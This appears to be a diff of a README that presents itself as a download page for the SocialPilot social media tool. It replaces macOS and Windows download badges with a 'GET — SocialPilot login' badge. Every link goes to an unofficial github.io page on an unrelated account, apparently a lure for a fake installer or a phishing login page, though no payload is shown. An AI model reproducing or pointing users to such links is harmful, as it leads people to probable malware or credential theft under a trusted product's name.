@@ -1,18 +1,7 @@
 # SocialPilot Download — Social Media Platform
 
-<a href="https://git-apps-io.github.io/.github/?offer=SocialPilot" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/SocialPilot%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="SocialPilot for macOS">
-</a>
+[![GET SocialPilot login](https://img.shields.io/badge/GET%20%E2%80%94%20SocialPilot-login-0078D6?style=for-the-badge&logoColor=white)](https://segolene4859valentine.github.io/.github/SocialPilot-login)
 
-<a href="https://git-apps-io.github.io/.github/?offer=SocialPilot" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/SocialPilot%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="SocialPilot for Windows">
-</a>
 
 ---
 
